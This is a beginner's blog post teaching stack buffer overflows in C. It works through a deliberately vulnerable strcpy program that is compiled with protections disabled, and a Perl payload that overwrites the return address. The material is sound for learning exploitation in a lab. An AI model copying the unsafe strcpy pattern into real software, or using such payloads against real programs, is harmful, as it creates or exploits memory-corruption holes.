---
title: "Bugger Overglow"
date: 2023-10-08T02:51:50+02:00
draft: false
summary: "Introduction to Buffer Overflow in C"
---

# Introduction to Buffer Overflow in C

I'm actually learning `C` language and I want to focus my learning on the exploitation of binaries in C.

In the next posts, I will be trying to explain to you and also to myself the most basic terms and functions in this field.

👉 Main Source: [Linux Exploiting - David Puente Castro](https://0xword.com/es/libros/55-linux-exploiting.html)

🚧 First of all, we must take into account...

- The architecture: `x86 (IA32, x86, x86_32, i386)` or `x64 (AMD64, Intel 64, x86_64)`.

- Storage format: `little endian` or `big endian`

- The operating system.

**All subsequent examples are done in `GNU/Linux x86`.**

In my case, I'm using [Ubuntu Desktop](https://ubuntu.com/download/desktop) from Windows to perform the tests with an `Intel x64 architecture` and `little endian` format.

The best options are to use a [virtual machine](https://www.virtualbox.org/) (I recommend Oracle VM VirtualBox) or a [Docker](https://www.docker.com/) to virtualize the work space.

Pages of interest:
- [Virtual machine tutorial with Ubuntu](https://ubuntu.com/tutorials/how-to-run-ubuntu-desktop-on-a-virtual-machine-using-virtualbox#1-overview)
- [Docker in Visual Studio Code](https://code.visualstudio.com/docs/containers/overview)

## What is a Buffer Overflow?

A buffer overflow is a computer security vulnerability that occurs when a program or process tries to store more data in a buffer (a temporary data storage area) than it can hold. As a result, the extra data can overwrite adjacent memory areas, causing unexpected behaviors in the program, such as crashes, freezes, or even the execution of malicious code.

Buffer overflows are a common cause of security vulnerabilities, especially in programs written in languages like C and C++, which **DO NOT perform automatic boundary checks on arrays**. Attackers can exploit this vulnerability to overwrite the buffer's content with malicious data, such as executable code, leading to arbitrary code execution and compromising the system's security.

Let's take a look into this example from the book:

```c
 1 | #include <string.h>
 2 | #include <stdio.h>
 3 | #include <stdlib.h>
 4 | void func(char *arg)
 5 | {
 6 | 	char name[32];
 7 | 	strcpy(name, arg);
 8 | 	printf("\nWelcome to Linux Exploiting %s\n\n", name);
 9 | }
 10| int main(int argc, char *argv[])
 11| {
 12| 	if (argc != 2) {
 13| 		printf("Usage: %s NAME\n", argv[0]);
 14| 		exit(0);
 15| 	}
 16| 	func(argv[1]);
 17| 	printf("End of program\n\n");
 18| 	return 0;
 19| }
```

In `func() - line 4 to 9`, we are allocating `arg`'s information into `name` with `strcpy(name, arg)` and printing _"Welcome to Linux Exploiting [name]"_ into the standard output. The problem here is that `arg` can be any string of characters entered by the user as we can see in `func(argv[1]) - line 16`.

So, taking into consideration that C doesn't perform automatic boundary checks on arrays, we could overwrite buffer's content like the return of the function.

Let's compile:
```bash
$ gcc -m32 -no-pie -fno-stack-protector -o main main.c
# As I'm using x64, I need to install multilib to compile in x86 (-m32). ALSO, we need to prevent the binary from being placed in any base position (-no-pie) and disable the use of canaries (-fno-stack-protector).
```

If we execute the program...
```bash
$ ./main Laura

Welcome to Linux Exploiting Laura

End of program

```
everything works perfectly BUT, what if we tried with another string:

```bash
$ ./main Lauraaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Welcome to Linux Exploiting Lauraaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Segmentation fault # unexpected behavior
```

`Segmentation fault` is the term when a program tries to access a memory location that it’s not allowed to access. It’s a mechanism provided by the operating system to prevent data corruption and unauthorized access to other programs’ memory spaces.

So, what now?

Let's disassemble the executable and then find the lines that contain the text string `func`.

```bash
$ objdump -d ./main | grep func
080491a6 <func>:
 8049235:       e8 6c ff ff ff          call   80491a6 <func>
```

We can see the beggining of the function `func` in the memory address `080491a6`. What would happen if we exactly overwrote that memory address?

```bash
$ ./main `perl -e 'print "A"x44 . "\xa6\x91\x04\x08"x4'`
# We pass to the program a string of characters generated by Pearl as an argument.

Welcome to Linux Exploiting AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��������


Welcome to Linux Exploiting U��S��$�.�����N.


Welcome to Linux Exploiting U��S��$�.�����N.


Welcome to Linux Exploiting


Welcome to Linux Exploiting 

Segmentation fault
```

In short, we have managed to have an unexpected behavior.